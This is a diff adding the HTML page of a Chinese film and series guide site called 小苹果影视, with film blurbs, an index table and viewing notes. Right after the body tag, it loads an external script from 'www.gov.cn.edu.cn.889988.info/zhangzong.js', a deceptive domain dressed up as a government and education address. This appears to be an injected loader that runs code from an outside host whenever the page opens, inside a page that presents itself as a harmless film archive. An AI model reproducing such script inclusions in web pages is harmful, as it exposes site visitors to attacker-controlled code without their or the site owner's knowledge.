@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0d0b09">
+<title>小苹果影视 – 独立影视资料库与观影指南 | xiaopingguoyingshi-zh.github.io</title>
+<meta name="description" content="小苹果影视是一个专注于影视作品整理与观影参考的独立站点，涵盖院线新片、经典修复、剧集档案与纪录片索引。在 xiaopingguoyingshi-zh.github.io 浏览按类型、年代与评分归类的影视资料，发现值得一看的片子。">
+<meta name="keywords" content="小苹果影视, 影视资料库, 在线影视指南, 电影推荐, 剧集档案, 高分电影, 经典影片, 纪录片推荐, xiaopingguoyingshi-zh, xiaopingguoyingshi-zh.github.io">
+<meta name="author" content="小苹果影视">
+<meta name="application-name" content="小苹果影视">
+<meta property="og:title" content="小苹果影视 – 独立影视资料库与观影指南">
+<meta property="og:description" content="按类型、年代与评分归类的影视资料，涵盖院线新片、经典修复、剧集档案与纪录片。">
+<meta property="og:url" content="https://xiaopingguoyingshi-zh.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="小苹果影视">
+<link rel="canonical" href="https://xiaopingguoyingshi-zh.github.io">
+<style>
+:root{
+  --ink:#e8e2d6;
+  --ink-dim:#9a9285;
+  --ink-faint:#6b6458;
+  --paper:#0d0b09;
+  --paper-2:#15120e;
+  --paper-3:#1d1914;
+  --amber:#c9973f;
+  --amber-deep:#a67c2c;
+  --rule:rgba(201,151,63,.18);
+  --max:1180px;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,"Helvetica Neue",Arial,sans-serif;
+  font-size:15.5px;
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  background:
+    radial-gradient(900px 500px at 12% -10%, rgba(201,151,63,.10), transparent 60%),
+    radial-gradient(700px 400px at 110% 8%, rgba(201,151,63,.06), transparent 55%);
+  pointer-events:none;
+  z-index:0;
+}
+a{color:inherit;text-decoration:none;}
+img{max-width:100%;display:block;}
+.wrap{position:relative;z-index:1;}
+
+/* ===== 顶部条 ===== */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(13,11,9,.86);
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--rule);
+}
+.topbar-in{
+  max-width:var(--max);margin:0 auto;padding:12px 22px;
+  display:flex;align-items:center;gap:18px;
+}
+.brand{display:flex;align-items:baseline;gap:9px;font-weight:700;letter-spacing:.02em;}
+.brand b{font-size:19px;color:var(--ink);}
+.brand b i{font-style:normal;color:var(--amber);}
+.brand span{font-size:11.5px;color:var(--ink-faint);letter-spacing:.14em;text-transform:lowercase;}
+.nav-toggle{
+  display:none;margin-left:auto;background:none;border:1px solid var(--rule);
+  color:var(--ink);padding:7px 12px;font-size:12.5px;letter-spacing:.1em;border-radius:2px;cursor:pointer;
+}
+.nav{
+  margin-left:auto;display:flex;align-items:center;gap:4px;
+}
+.nav a{
+  padding:6px 13px;font-size:13px;color:var(--ink-dim);letter-spacing:.06em;
+  border:1px solid transparent;border-radius:2px;transition:.2s;
+}
+.nav a:hover{color:var(--amber);border-color:var(--rule);background:rgba(201,151,63,.06);}
+.nav .go{
+  margin-left:10px;border:1px solid var(--amber-deep);color:var(--amber);
+  font-size:12px;padding:6px 14px;
+}
+.nav .go:hover{background:var(--amber);color:#0d0b09;}
+
+/* ===== 布局 ===== */
+.layout{
+  max-width:var(--max);margin:0 auto;padding:34px 22px 70px;
+  display:grid;grid-template-columns:196px 1fr;gap:44px;align-items:start;
+}
+.toc{
+  position:sticky;top:76px;border:1px solid var(--rule);background:var(--paper-2);
+  padding:20px 16px;
+}
+.toc h4{
+  margin:0 0 14px;font-size:11px;letter-spacing:.22em;color:var(--ink-faint);font-weight:600;
+}
+.toc ol{list-style:none;margin:0;padding:0;counter-reset:t;}
+.toc li{counter-increment:t;}
+.toc a{
+  display:flex;gap:10px;align-items:baseline;padding:8px 4px;
+  font-size:13.5px;color:var(--ink-dim);border-bottom:1px dashed rgba(255,255,255,.05);
+}
+.toc a::before{
+  content:counter(t,decimal-leading-zero);font-size:10.5px;color:var(--amber-deep);
+  font-variant-numeric:tabular-nums;min-width:20px;
+}
+.toc a:hover{color:var(--ink);}
+.toc .here{color:var(--amber);}
+
+main{min-width:0;}
+.hero{padding:26px 0 30px;border-bottom:1px solid var(--rule);}
+.hero .eyebrow{
+  font-size:11.5px;letter-spacing:.26em;color:var(--amber);text-transform:uppercase;margin-bottom:16px;
+}
+.hero h1{
+  font-size:clamp(30px,5.4vw,56px);line-height:1.12;margin:0 0 18px;font-weight:800;letter-spacing:-.01em;
+}
+.hero h1 em{font-style:normal;color:var(--amber);}
+.hero p.lead{
+  margin:0;max-width:62ch;font-size:16px;color:var(--ink-dim);
+}
+.hero .meta{
+  margin-top:24px;display:flex;flex-wrap:wrap;gap:10px;
+}
+.hero .meta code{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:12px;color:var(--ink-dim);border:1px solid var(--rule);padding:5px 11px;background:var(--paper-3);
+}
+.hero .meta code b{color:var(--amber);font-weight:600;}
+
+/* ===== 栏目 ===== */
+section{padding:46px 0;border-bottom:1px solid var(--rule);}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:24px;}
+.sec-head .no{
+  font-size:12px;color:var(--amber-deep);letter-spacing:.1em;font-variant-numeric:tabular-nums;
+  border:1px solid var(--rule);padding:3px 8px;height:fit-content;
+}
+.sec-head h2{margin:0;font-size:23px;font-weight:700;letter-spacing:.01em;}
+.sec-head .sub{margin-left:auto;font-size:12.5px;color:var(--ink-faint);letter-spacing:.06em;}
+
+/* 胶片条 */
+.reel{
+  display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;
+  padding:4px 2px 18px;scrollbar-width:thin;scrollbar-color:var(--amber-deep) transparent;
+}
+.reel::-webkit-scrollbar{height:7px;}
+.reel::-webkit-scrollbar-thumb{background:var(--amber-deep);border-radius:0;}
+.reel .card{
+  flex:0 0 218px;scroll-snap-align:start;border:1px solid var(--rule);background:var(--paper-2);
+  transition:.25s;position:relative;overflow:hidden;
+}
+.reel .card:hover{border-color:var(--amber-deep);transform:translateY(-3px);}
+.frame{
+  aspect-ratio:16/10;background:var(--paper-3);position:relative;
+  display:flex;align-items:flex-end;padding:12px;overflow:hidden;
+}
+.frame::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 55%,rgba(13,11,9,.92));
+}
+.frame .yr{
+  position:relative;z-index:2;font-family:ui-monospace,monospace;font-size:11px;color:var(--amber);
+  letter-spacing:.12em;border-left:2px solid var(--amber);padding-left:7px;
+}
+.frame .grain{
+  position:absolute;inset:0;opacity:.16;mix-blend-mode:overlay;
+  background-image:linear-gradient(90deg,transparent 48%,rgba(255,255,255,.5) 49%,rgba(255,255,255,.5) 51%,transparent 52%),
+  linear-gradient(0deg,transparent 48%,rgba(255,255,255,.4) 49%,rgba(255,255,255,.4) 51%,transparent 52%);
+  background-size:9px 9px;
+}
+.reel .card .body{padding:13px 14px 15px;}
+.reel .card h3{margin:0 0 6px;font-size:15px;font-weight:650;letter-spacing:.01em;}
+.reel .card p{margin:0;font-size:12.5px;color:var(--ink-faint);line-height:1.6;}
+.tagline{margin-top:9px;font-size:11px;color:var(--amber-deep);letter-spacing:.08em;}
+
+/* 文字型栏目 */
+.lede{display:grid;grid-template-columns:1fr 1fr;gap:26px;}
+.lede article{border-left:1px solid var(--rule);padding-left:18px;}
+.lede h3{margin:0 0 8px;font-size:15.5px;font-weight:650;}
+.lede p{margin:0;font-size:14px;color:var(--ink-dim);}
+.lede .k{font-size:11.5px;color:var(--amber-deep);letter-spacing:.14em;display:block;margin-bottom:6px;}
+
+/* 索引表 */
+.idx{width:100%;border-collapse:collapse;font-size:13.5px;}
+.idx th{
+  text-align:left;font-weight:600;font-size:11px;letter-spacing:.14em;color:var(--ink-faint);
+  padding:9px 12px;border-bottom:1px solid var(--amber-deep);
+}
+.idx td{padding:11px 12px;border-bottom:1px dashed rgba(255,255,255,.06);color:var(--ink-dim);vertical-align:top;}
+.idx tr:hover td{color:var(--ink);background:rgba(201,151,63,.045);}
+.idx td.n{font-family:ui-monospace,monospace;font-size:12px;color:var(--amber-deep);white-space:nowrap;}
+.idx td b{color:var(--ink);font-weight:600;}
+
+/* 笔记墙 */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+.note{
+  background:var(--paper-2);border:1px solid var(--rule);padding:18px 16px;
+  position:relative;
+}
+.note::before{
+  content:"";position:absolute;left:-1px;top:14px;width:3px;height:26px;background:var(--amber);
+}
+.note h4{margin:0 0 8px;font-size:14.5px;font-weight:650;}
+.note p{margin:0;font-size:13px;color:var(--ink-dim);}
+.note .d{margin-top:12px;font-size:11px;color:var(--ink-faint);letter-spacing:.08em;}
+
+/* 页脚 */
+footer{border-top:1px solid var(--rule);padding:34px 22px 50px;background:var(--paper-2);}
+.foot-in{max-width:var(--max);margin:0 auto;display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:28px;}
+footer h5{margin:0 0 12px;font-size:11.5px;letter-spacing:.2em;color:var(--amber-deep);font-weight:600;}
+footer p{margin:0;font-size:13px;color:var(--ink-dim);}
+footer code{
+  display:block;font-family:ui-monospace,monospace;font-size:12.5px;color:var(--ink);
+  border:1px solid var(--rule);padding:9px 11px;background:var(--paper-3);word-break:break-all;
+}
+.legal{padding-top:22px;margin-top:26px;border-top:1px dashed rgba(255,255,255,.08);
+  font-size:12px;color:var(--ink-faint);display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;}
+
+/* ===== 移动端 ===== */
+@media (max-width:860px){
+  .layout{grid-template-columns:1fr;gap:0;padding-top:20px;}
+  .toc{
+    position:static;margin-bottom:22px;padding:14px 16px;
+    max-height:none;display:none;
+  }
+  .toc.open{display:block;}
+  .nav-toggle{display:block;}
+  .nav{display:none;}
+  .lede{grid-template-columns:1fr;}
+  .notes{grid-template-columns:1fr 1fr;}
+  .foot-in{grid-template-columns:1fr;gap:22px;}
+  section{padding:36px 0;}
+}
+@media (max-width:520px){
+  .topbar-in{padding:11px 16px;}
+  .brand b{font-size:17px;}
+  .layout{padding-left:16px;padding-right:16px;}
+  .reel .card{flex-basis:172px;}
+  .notes{grid-template-columns:1fr;}
+  .hero .meta code{font-size:11px;}
+  footer{padding-left:16px;padding-right:16px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="wrap">
+
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brand">
+      <b>小苹果<i>影视</i></b>
+      <span>xiaopingguoyingshi-zh.github.io</span>
+    </div>
+    <button class="nav-toggle" onclick="var t=document.getElementById('toc');t.classList.toggle('open');">
+      章节导航 ▾
+    </button>
+    <nav class="nav" id="nav">
+      <a href="#start">首页</a>
+      <a href="#now">院线速递</a>
+      <a href="#classic">经典修复</a>
+      <a href="#series">剧集档案</a>
+      <a href="#doc">纪录片</a>
+      <a href="#index">索引</a>
+      <a href="#notes">观影手记</a>
+      <a href="#site" class="go">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<div class="layout">
+  <!-- 侧栏目录 -->
+  <aside class="toc" id="toc">
+    <h4>目 录 / Contents</h4>
+    <ol>
+      <li><a href="#start" class="here">开篇</a></li>
+      <li><a href="#now">院线速递</a></li>
+      <li><a href="#classic">经典修复</a></li>
+      <li><a href="#series">剧集档案</a></li>
+      <li><a href="#doc">纪录片观察</a></li>
+      <li><a href="#index">资料索引</a></li>
+      <li><a href="#notes">观影手记</a></li>
+      <li><a href="#site">关于本站</a></li>
+    </ol>
+  </aside>
+
+  <!-- 主体 -->
+  <main>
+
+    <div class="hero" id="start">
+      <div class="eyebrow">Film &amp; Series Archive · Est. 2026</div>
+      <h1>小苹果影视<br><em>一份不赶热度的观影档案</em></h1>
+      <p class="lead">不追榜单、不堆资讯。这里把值得看的电影与剧集按类型、年代和质感重新归拢，配上短评与观看线索，供你自己决定今晚打开哪一部。</p>
+      <div class="meta">
+        <code>站点：<b>https://xiaopingguoyingshi-zh.github.io</b></code>
+        <code>栏目：07</code>
+        <code>更新：每周三</code>
+      </div>
+    </div>
+
+    <!-- 01 -->
+    <section id="now">
+      <div class="sec-head">
+        <span class="no">01</span>
+        <h2>院线速递</h2>
+        <span class="sub">正在或刚下画的片子，只留值得回头看的</span>
+      </div>
+      <div class="reel">
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">2026 · 剧情</span></div>
+          <div class="body">
+            <h3>河岸上的长夜</h3>
+            <p>县城父子在一场葬礼前的沉默对峙，镜头几乎不挪位置。</p>
+            <div class="tagline">节奏慢 · 台词少</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">2026 · 悬疑</span></div>
+          <div class="body">
+            <h3>第七次敲门</h3>
+            <p>封闭公寓里的连环误认，真相藏在第二十五分钟的音效里。</p>
+            <div class="tagline">结构精巧 · 可二刷</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">2026 · 动画</span></div>
+          <div class="body">
+            <h3>纸船旅馆</h3>
+            <p>手绘质感的海边童话，配乐用的是真实潮汐录音。</p>
+            <div class="tagline">适合放松时看</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">2026 · 喜剧</span></div>
+          <div class="body">
+            <h3>加班宇宙</h3>
+            <p>打工人穿越到自己简历里的荒诞短章，笑点不靠谐音。</p>
+            <div class="tagline">轻量 · 90 分钟</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">2026 · 犯罪</span></div>
+          <div class="body">
+            <h3>南方雨停之前</h3>
+            <p>一桩旧劫案的复盘，叙事线来回切，结尾留一道缝。</p>
+            <div class="tagline">建议一次看完</div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 02 -->
+    <section id="classic">
+      <div class="sec-head">
+        <span class="no">02</span>
+        <h2>经典修复</h2>
+        <span class="sub">老片不是过时，是换了个更清楚的姿势重新站着</span>
+      </div>
+      <div class="lede">
+        <article>
+          <span class="k">修复版怎么选</span>
+          <h3>4K 重制不等于更好看</h3>
+          <p>颗粒感、胶片划痕与原始调色，是导演当年选定的“语气”。挑选修复版时，先看是否由原始底片扫描、是否经过主创监修，别只盯着分辨率四个字。</p>
+        </article>
+        <article>
+          <span class="k">本月片单</span>
+          <h3>三部长镜头，各自活法</h3>
+          <p>从七十年代的公路片到千禧年前后的城市观察，镜头不剪不是炫技，是为了让角色和空间一起喘气。这一组适合关掉弹幕、调亮屏幕看。</p>
+        </article>
+        <article>
+          <span class="k">观看顺序</span>
+          <h3>导演早期短片的线索</h3>
+          <p>很多后来的母题，早就躲在成名前的十几分钟短片里。顺着短片 → 长片处女作 → 成熟期代表作的路径走，比按奖项排行更能看懂一个人。</p>
+        </article>
+        <article>
+          <span class="k">别错过</span>
+          <h3>被类型片外衣藏住的作品</h3>
+          <p>挂着惊悚或武侠的牌子，讲的其实是迁徙、代际与乡愁。这类片子在流媒体推荐里常被埋掉，值得单独翻出来摆上台面。</p>
+        </article>
+      </div>
+    </section>
+
+    <!-- 03 -->
+    <section id="series">
+      <div class="sec-head">
+        <span class="no">03</span>
+        <h2>剧集档案</h2>
+        <span class="sub">按“怎么追”而不是“几星”来分</span>
+      </div>
+      <div class="reel">
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">剧集 · 8 集</span></div>
+          <div class="body">
+            <h3>一间面馆的冬天</h3>
+            <p>单元式群像，每集换一位食客。下饭但不轻飘，适合一天一集。</p>
+            <div class="tagline">治愈向 · 低门槛</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">剧集 · 12 集</span></div>
+          <div class="body">
+            <h3>地图没有这条街</h3>
+            <p>双线年代剧，前半段笑、后半段闷。需要连着看，断档会丢线索。</p>
+            <div class="tagline">沉浸式 · 别跳集</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">剧集 · 6 集</span></div>
+          <div class="body">
+            <h3>深夜调音师</h3>
+            <p>每集一个独立案件式的音乐谜题，短小、收得干净，通勤友好。</p>
+            <div class="tagline">短剧 · 单集 30′</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">剧集 · 1 季</span></div>
+          <div class="body">
+            <h3>未完成的旅行</h3>
+            <p>伪纪录片质感的山地徒步，节奏极慢，看的是人怎么和自己相处。</p>
+            <div class="tagline">助眠级安静</div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="frame"><span class="grain"></span><span class="yr">剧集 · 连载中</span></div>
+          <div class="body">
+            <h3>柜台后面的人</h3>
+            <p>职场轻喜剧，笑点埋在细节里。更新慢，反而适合攒几集一起看。</p>
+            <div class="tagline">轻松 · 可囤</div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 04 -->
+    <section id="doc">
+      <div class="sec-head">
+        <span class="no">04</span>
+        <h2>纪录片观察</h2>
+        <span class="sub">真实本身就有足够多的弯弯绕</span>
+      </div>
+      <div class="lede">
+        <article>
+          <span class="k">主题</span>
+          <h3>手艺人的最后十年</h3>
+          <p>跟拍三位老手艺人的日常，没有旁白煽情，只有锤子声和喝茶的间隙。看完会觉得“慢”是一种技术。</p>
+        </article>
+        <article>
+          <span class="k">主题</span>
+          <h3>一条河的体检报告</h3>
+          <p>用五年时间记录同一条河的水位、鱼群与岸边人的变化，数据被拍成了画面，比任何解说都有力。</p>
+        </article>
+        <article>
+          <span class="k">怎么看</span>
+          <h3>别把纪录片当答案</h3>
+          <p>镜头也有立场，剪辑就是取舍。看的时候留意谁在说话、谁没被拍到，比记住结论更重要。</p>
+        </article>
+        <article>
+          <span class="k">片单</span>
+          <h3>冷门但扎实的五部</h3>
+          <p>不进热榜的自然史、建筑、音乐类纪录片，篇幅偏长，适合周末留出整块时间慢慢吃。</p>
+        </article>
+      </div>
+    </section>
+
+    <!-- 05 索引 -->
+    <section id="index">
+      <div class="sec-head">
+        <span class="no">05</span>
+        <h2>资料索引</h2>
+        <span class="sub">快速定位，不绕弯子</span>
+      </div>
+      <table class="idx">
+        <thead>
+          <tr><th style="width:64px">编号</th><th>条目</th><th style="width:150px">归类</th><th style="width:120px">年代</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="n">XA-01</td><td><b>河岸上的长夜</b> — 父子关系，单一场景叙事</td><td>院线 · 剧情</td><td>2026</td></tr>
+          <tr><td class="n">XA-02</td><td><b>第七次敲门</b> — 封闭空间推理，声效线索</td><td>院线 · 悬疑</td><td>2026</td></tr>
+          <tr><td class="n">XA-03</td><td><b>纸船旅馆</b> — 手绘动画，自然音效配乐</td><td>院线 · 动画</td><td>2026</td></tr>
+          <tr><td class="n">XA-04</td><td><b>修复版观看指南</b> — 底片扫描与监修怎么看</td><td>经典 · 科普</td><td>常驻</td></tr>
+          <tr><td class="n">XA-05</td><td><b>一间面馆的冬天</b> — 单元群像，慢节奏</td><td>剧集 · 治愈</td><td>2025</td></tr>
+          <tr><td class="n">XA-06</td><td><b>地图没有这条街</b> — 双线年代，线索密集</td><td>剧集 · 剧情</td><td>2025</td></tr>
+          <tr><td class="n">XA-07</td><td><b>手艺人的最后十年</b> — 无旁白观察式记录</td><td>纪录片 · 人文</td><td>2024</td></tr>
+          <tr><td class="n">XA-08</td><td><b>一条河的体检报告</b> — 长周期自然观察</td><td>纪录片 · 自然</td><td>2023</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- 06 手记 -->
+    <section id="notes">
+      <div class="sec-head">
+        <span class="no">06</span>
+        <h2>观影手记</h2>
+        <span class="sub">短，且不剧透</span>
+      </div>
+      <div class="notes">
+        <div class="note">
+          <h4>别被片长劝退</h4>
+          <p>超过两个半小时的片子，往往只是不肯删废戏。挑个清醒的晚上，一口气吃掉，比分成三晚舒服得多。</p>
+          <div class="d">手记 · 选片</div>
+        </div>
+        <div class="note">
+          <h4>字幕也是翻译</h4>
+          <p>同一部片换一版字幕，语气能差出一条街。文艺片多看两版，有时候是被翻译救回来的。</p>
+          <div class="d">手记 · 细节</div>
+        </div>
+        <div class="note">
+          <h4>二刷要看哪里</h4>
+          <p>第二遍别追剧情，去看开场三分钟里摆了哪些东西。好片的道具都会回来。</p>
+          <div class="d">手记 · 方法</div>
+        </div>
+        <div class="note">
+          <h4>烂片也有用</h4>
+          <p>看一部失败的悬疑片，比看十篇拉片文更懂什么叫节奏失控。别只看好东西。</p>
+          <div class="d">手记 · 心态</div>
+        </div>
+        <div class="note">
+          <h4>一个人看也挺好</h4>
+          <p>笑点没人接、哭点没人递纸，但你能听见配乐。有些片子本来就适合独享。</p>
+          <div class="d">手记 · 习惯</div>
+        </div>
+        <div class="note">
+          <h4>记下时间码</h4>
+          <p>看到喜欢的镜头，记一下时间码和一句原因。攒半年，你就有了自己的拉片本。</p>
+          <div class="d">手记 · 积累</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 关于 -->
+    <section id="site">
+      <div class="sec-head">
+        <span class="no">07</span>
+        <h2>关于本站</h2>
+        <span class="sub">小苹果影视是什么，以及不是什么</span>
+      </div>
+      <div class="lede">
+        <article>
+          <span class="k">是什么</span>
+          <h3>一个静态的、自己的影视角落</h3>
+          <p>小苹果影视（xiaopingguoyingshi-zh）只做一件事：把看过的影视作品整理成能查、能翻、能顺着看下去的档案。没有弹窗、没有追更焦虑，页面打开就是内容。</p>
+        </article>
+        <article>
+          <span class="k">不是什么</span>
+          <h3>不做资源搬运，也不做评分机器</h3>
+          <p>这里不提供下载与在线播放链路，也不替你下结论打几分。所有条目是观看参考与资料索引，具体正版观看渠道请以各平台为准。</p>
+        </article>
+        <article>
+          <span class="k">地址</span>
+          <h3>唯一入口</h3>
+          <p>本站仅发布于 GitHub Pages，唯一地址为 <b>https://xiaopingguoyingshi-zh.github.io</b>，请注意辨认，避免误入仿冒站点。</p>
+        </article>
+        <article>
+          <span class="k">更新</span>
+          <h3>慢，但有迹可循</h3>
+          <p>片单与手记按周更新，新增条目会进入资料索引并标注编号。旧内容不删，只补注，让每一页都能当回头看的底稿。</p>
+        </article>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>
+  <div class="foot-in">
+    <div>
+      <h5>小苹果影视 / XIAOPINGGUO YINGSHI</h5>
+      <p>独立影视资料与观影参考站点，记录值得一看的电影、剧集与纪录片。所有内容为观看笔记性质，不涉及资源分发。</p>
+    </div>
+    <div>
+      <h5>唯一官方地址</h5>
+      <code>https://xiaopingguoyingshi-zh.github.io</code>
+    </div>
+    <div>
+      <h5>站内导航</h5>
+      <p><a href="#start" style="color:var(--ink-dim)">首页</a> · <a href="#now" style="color:var(--ink-dim)">院线</a> · <a href="#classic" style="color:var(--ink-dim)">经典</a> · <a href="#series" style="color:var(--ink-dim)">剧集</a> · <a href="#doc" style="color:var(--ink-dim)">纪录片</a> · <a href="#notes" style="color:var(--ink-dim)">手记</a></p>
+    </div>
+  </div>
+  <div class="legal">
+    <span>© 2026 小苹果影视 · xiaopingguoyingshi-zh · 本站内容仅供观影参考</span>
+    <span>https://xiaopingguoyingshi-zh.github.io</span>
+  </div>
+</footer>
+
+</div>
+</body>
+</html>
